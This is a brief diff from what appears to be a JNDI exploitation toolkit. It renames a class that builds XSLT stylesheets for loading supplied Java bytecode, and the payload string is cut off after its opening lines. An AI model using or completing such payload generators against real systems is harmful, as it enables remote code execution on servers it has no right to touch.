@@ -2,7 +2,7 @@ package map.jndi.payload;
 
 import java.util.Base64;
 
-public class XsltPayload {
+public class XSLTPayload {
     public static String loadClass(String className, byte[] byteCode) {
         return "<xsl:stylesheet version=\"1.0\"" +
                 "  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"" +
